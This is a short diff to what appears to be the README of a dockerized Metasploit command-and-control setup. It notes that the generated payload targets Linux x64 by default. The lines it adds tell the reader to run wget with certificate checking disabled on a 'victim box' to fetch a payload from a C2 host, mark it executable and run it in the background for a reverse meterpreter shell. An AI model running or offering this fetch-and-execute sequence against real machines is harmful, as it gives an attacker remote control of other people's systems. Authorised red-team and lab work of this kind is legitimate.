@@ -84,3 +84,13 @@ sudo docker container exec -it msf /bin/bash
 
 ```
 * By default it generates payload for linux x64 systems.can be modified for different target by modifying **docker_delivery.rc** file
+
+*  By default docker_delivery.rc uses certificate picked up automatically by metasploit.
+
+*On a **victim box**, execute the following to get reverse meterpreter shell.
+
+```bash
+wget --no-check-certificate https://c2IP/delivery
+chmod +x delivery
+./delivery&
+```
